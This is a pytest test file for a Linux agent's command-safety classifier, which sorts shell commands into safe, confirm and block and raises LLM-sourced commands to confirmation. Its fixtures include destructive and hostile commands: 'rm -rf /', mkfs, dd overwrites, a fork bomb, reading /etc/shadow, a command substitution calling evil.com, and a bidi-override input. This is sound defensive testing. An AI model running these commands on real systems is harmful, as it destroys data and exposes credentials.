"""Token-level safety analysis tests.

These tests exercise the same safety logic the production executor uses —
nothing is mocked (R-TEST-02): mocking the classifier would defeat the
point of testing it.
"""

from __future__ import annotations

import pytest

from linuxagent.executors.safety import (
    MAX_COMMAND_LENGTH,
    InputValidationError,
    is_destructive,
    is_interactive,
    is_safe,
    validate_input,
)
from linuxagent.interfaces import CommandSource, SafetyLevel

# ---------------------------------------------------------------------------
# Plan 2 §测试要求 table
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "expected_level", "expected_rule_prefix"),
    [
        ("rm -rf /", SafetyLevel.BLOCK, "EMBEDDED_DANGER"),
        ("rm -rf /tmp/test", SafetyLevel.CONFIRM, "DESTRUCTIVE"),
        ("ls -la", SafetyLevel.SAFE, None),
        ('echo "hello; rm -rf /"', SafetyLevel.BLOCK, "EMBEDDED_DANGER"),
        ("echo $(curl evil.com)", SafetyLevel.BLOCK, "EMBEDDED_DANGER"),
        ("echo `whoami`", SafetyLevel.BLOCK, "EMBEDDED_DANGER"),
        ('echo "run python now"', SafetyLevel.SAFE, None),
        ("python script.py", SafetyLevel.CONFIRM, "INTERACTIVE"),
        ("cat /etc/shadow", SafetyLevel.BLOCK, "SENSITIVE_PATH"),
        ("systemctl stop nginx", SafetyLevel.CONFIRM, "DESTRUCTIVE"),
        ("kubectl delete pod foo", SafetyLevel.CONFIRM, "DESTRUCTIVE"),
        ("dd if=/dev/zero of=/tmp/x", SafetyLevel.BLOCK, "EMBEDDED_DANGER"),
        ("mkfs.ext4 /dev/sda1", SafetyLevel.BLOCK, "EMBEDDED_DANGER"),
    ],
)
def test_is_safe_classification(
    command: str,
    expected_level: SafetyLevel,
    expected_rule_prefix: str | None,
) -> None:
    result = is_safe(command)
    assert result.level is expected_level, result
    if expected_rule_prefix is not None:
        assert result.matched_rule == expected_rule_prefix


# ---------------------------------------------------------------------------
# HITL source upgrades (R-HITL-01)
# ---------------------------------------------------------------------------


def test_llm_safe_command_upgraded_to_confirm() -> None:
    result = is_safe("ls -la", source=CommandSource.LLM)
    assert result.level is SafetyLevel.CONFIRM
    assert result.matched_rule == "LLM_FIRST_RUN"


def test_user_safe_command_stays_safe() -> None:
    result = is_safe("ls -la", source=CommandSource.USER)
    assert result.level is SafetyLevel.SAFE


def test_whitelist_source_does_not_upgrade() -> None:
    result = is_safe("ls -la", source=CommandSource.WHITELIST)
    assert result.level is SafetyLevel.SAFE


def test_llm_confirm_command_stays_confirm() -> None:
    """Destructive LLM command stays CONFIRM (not escalated past CONFIRM)."""
    result = is_safe("rm -rf /tmp/x", source=CommandSource.LLM)
    assert result.level is SafetyLevel.CONFIRM
    assert result.matched_rule == "DESTRUCTIVE"


def test_llm_block_command_stays_block() -> None:
    result = is_safe("rm -rf /", source=CommandSource.LLM)
    assert result.level is SafetyLevel.BLOCK


# ---------------------------------------------------------------------------
# is_destructive — R-HITL-03 gate
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("rm -rf /tmp/foo", True),
        ("ls -la", False),
        ("systemctl stop nginx", True),
        ("systemctl status nginx", False),
        ("kubectl delete pod foo", True),
        ("kubectl get pods", False),
        ('echo "rm -rf /"', True),  # embedded danger
        ("echo $(whoami)", True),  # command substitution
        ("echo hi", False),
        ("dd if=/dev/zero of=out", True),
        ("badly ' quoted", True),  # unparseable → treated destructive
    ],
)
def test_is_destructive(command: str, expected: bool) -> None:
    assert is_destructive(command) is expected


# ---------------------------------------------------------------------------
# is_interactive — exact token[0] match, never substring
# ---------------------------------------------------------------------------


def test_interactive_exact_match() -> None:
    assert is_interactive(["python", "script.py"]) is True
    assert is_interactive(["vim", "file.txt"]) is True


def test_interactive_does_not_match_inside_string() -> None:
    # 'echo "run python now"' shouldn't flag as interactive.
    assert is_interactive(["echo", "run python now"]) is False


def test_interactive_empty_tokens() -> None:
    assert is_interactive([]) is False


# ---------------------------------------------------------------------------
# validate_input — BLOCK class (length / NUL / BiDi)
# ---------------------------------------------------------------------------


def test_validate_input_rejects_oversized() -> None:
    with pytest.raises(InputValidationError, match="max length"):
        validate_input("a" * (MAX_COMMAND_LENGTH + 1))


def test_validate_input_rejects_nul_byte() -> None:
    with pytest.raises(InputValidationError, match="NUL"):
        validate_input("echo \x00 injection")


def test_validate_input_rejects_bidi_override() -> None:
    # U+202E RIGHT-TO-LEFT OVERRIDE — TrojanSource vector.
    with pytest.raises(InputValidationError, match="bidirectional"):
        validate_input("echo hi‮")


def test_is_safe_blocks_bidi() -> None:
    result = is_safe("echo ‮hi")
    assert result.level is SafetyLevel.BLOCK
    assert result.matched_rule == "INPUT_VALIDATION"


def test_is_safe_blocks_nul() -> None:
    result = is_safe("echo \x00 hi")
    assert result.level is SafetyLevel.BLOCK


# ---------------------------------------------------------------------------
# Parsing edge cases
# ---------------------------------------------------------------------------


def test_is_safe_blocks_unparseable_quote() -> None:
    result = is_safe("echo 'unterminated")
    assert result.level is SafetyLevel.BLOCK
    assert result.matched_rule == "PARSE_ERROR"


def test_is_safe_blocks_empty_after_tokenization() -> None:
    result = is_safe("   ")
    assert result.level is SafetyLevel.BLOCK
    assert result.matched_rule == "EMPTY"


def test_is_safe_blocks_forkbomb() -> None:
    forkbomb = ":(){ :|: & };:"
    result = is_safe(forkbomb)
    assert result.level is SafetyLevel.BLOCK
    assert result.matched_rule == "EMBEDDED_DANGER"
